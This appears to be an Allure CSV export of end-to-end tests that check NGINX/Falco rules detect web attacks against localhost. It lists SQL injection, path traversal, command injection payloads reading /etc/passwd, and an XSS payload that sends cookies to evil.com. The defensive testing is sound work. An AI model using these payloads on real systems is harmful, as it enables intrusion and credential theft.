"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_009` |
| **Name** | Base64 encoded pg_sleep(5) |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `cGdfc2xlZXAoNSk%3D`
- **Encoded**: `cGdfc2xlZXAoNSk%253D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~54000ms
- **Timestamp**: 09:41:42.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_009-1767433302857-g56o6r pattern_id=SQLI_TIME_009 uri=/?q=cGdfc2xlZXAoNSk%253D client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:41:42.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_009-1767433302857-g56o6r pattern_id=SQLI_TIME_009 uri=/?q=cGdfc2xlZXAoNSk%253D client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[063_SQLI_TIME_009]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_011` |
| **Name** | TRUE boolean literal |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR TRUE --`
- **Encoded**: `'%20OR%20TRUE%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~24000ms
- **Timestamp**: 09:42:12.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_011-1767433332422-dwi89s pattern_id=SQLI_BOOL_011 uri=/?q='%20OR%20TRUE%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:42:12.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_011-1767433332422-dwi89s pattern_id=SQLI_BOOL_011 uri=/?q='%20OR%20TRUE%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[025_SQLI_BOOL_011]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_TRUNC_002` |
| **Name** | Long path truncation |
| **Category** | PATH |
| **Subcategory** | truncation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd`
- **Encoded**: `..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~27000ms
- **Timestamp**: 09:42:09.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_002-1767433329392-o8jfk pattern_id=PATH_TRUNC_002 uri=/?q=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
09:42:09.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_002-1767433329392-o8jfk pattern_id=PATH_TRUNC_002 uri=/?q=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[178_PATH_TRUNC_002]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_020` |
| **Name** | CRLF injection with cat |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%0d%0acat /etc/passwd`
- **Encoded**: `%250d%250acat%20%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~33000ms
- **Timestamp**: 09:42:03.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_020-1767433323368-fk3pns pattern_id=CMD_BASIC_020 uri=/?q=%250d%250acat%20%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
09:42:03.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_020-1767433323368-fk3pns pattern_id=CMD_BASIC_020 uri=/?q=%250d%250acat%20%2Fetc%2Fpasswd client=127.0.0.1
```","1","test_e2e_with_logs[206_CMD_BASIC_020]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_015` |
| **Name** | ASCII function test |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR ASCII('A')=65 --`
- **Encoded**: `'%20OR%20ASCII('A')%3D65%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 09:42:14.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_015-1767433334427-2e25ot pattern_id=SQLI_BOOL_015 uri=/?q='%20OR%20ASCII('A')%3D65%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:42:14.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_015-1767433334427-2e25ot pattern_id=SQLI_BOOL_015 uri=/?q='%20OR%20ASCII('A')%3D65%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[029_SQLI_BOOL_015]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BYPASS_001` |
| **Name** | MySQL version comment WAF bypass |
| **Category** | SQLI |
| **Subcategory** | bypass_waf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/*!50000 UNION*/ /*!50000 SELECT*/ version(),NULL,NULL --`
- **Encoded**: `%21*50000%20UNION*%2F%20%21*50000%20SELECT*%2F%20version()%2CNULL%2CNULL%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~41000ms
- **Timestamp**: 09:41:55.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_001-1767433315886-hfdie9 pattern_id=SQLI_BYPASS_001 uri=/?q=%21*50000%20UNION*%2F%20%21*50000%20SELECT*%2F%20version()%2CNULL%2CNULL%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:41:55.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_001-1767433315886-hfdie9 pattern_id=SQLI_BYPASS_001 uri=/?q=%21*50000%20UNION*%2F%20%21*50000%20SELECT*%2F%20version()%2CNULL%2CNULL%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[030_SQLI_BYPASS_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_010` |
| **Name** | MySQL config access via traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../etc/mysql/my.cnf`
- **Encoded**: `../../../etc/mysql/my.cnf`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~41000ms
- **Timestamp**: 09:41:55.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_010-1767433315865-lw9j7k pattern_id=PATH_DOT_010 uri=/?q=../../../etc/mysql/my.cnf client=127.0.0.1

**Falco Log Entry**:
```
09:41:55.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_010-1767433315865-lw9j7k pattern_id=PATH_DOT_010 uri=/?q=../../../etc/mysql/my.cnf client=127.0.0.1
```","1","test_e2e_with_logs[167_PATH_DOT_010]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_WIN_002` |
| **Name** | Windows double backslash traversal |
| **Category** | PATH |
| **Subcategory** | windows_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\..\`
- **Encoded**: `..%5C..%5C`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 09:42:04.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_002-1767433324381-jliljh pattern_id=PATH_WIN_002 uri=/?q=..%5C..%5C client=127.0.0.1

**Falco Log Entry**:
```
09:42:04.000000000: Critical [NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_002-1767433324381-jliljh pattern_id=PATH_WIN_002 uri=/?q=..%5C..%5C client=127.0.0.1
```","1","test_e2e_with_logs[182_PATH_WIN_002]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_008` |
| **Name** | URL encoded WAITFOR DELAY |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `WAITFOR%20DELAY%20%270%3A0%3A5%27`
- **Encoded**: `WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~54000ms
- **Timestamp**: 09:41:42.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_008-1767433302356-p7aub pattern_id=SQLI_TIME_008 uri=/?q=WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:41:42.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_008-1767433302356-p7aub pattern_id=SQLI_TIME_008 uri=/?q=WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[062_SQLI_TIME_008]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_001` |
| **Name** | document.location manipulation |
| **Category** | XSS |
| **Subcategory** | dom_based_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `document.location='http://evil.com/?c='+document.cookie`
- **Encoded**: `document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~44000ms
- **Timestamp**: 09:41:52.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1767433312867-zmusdi pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET

**Falco Log Entry**:
```
09:41:52.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1767433312867-zmusdi pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[090_XSS_DOM_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
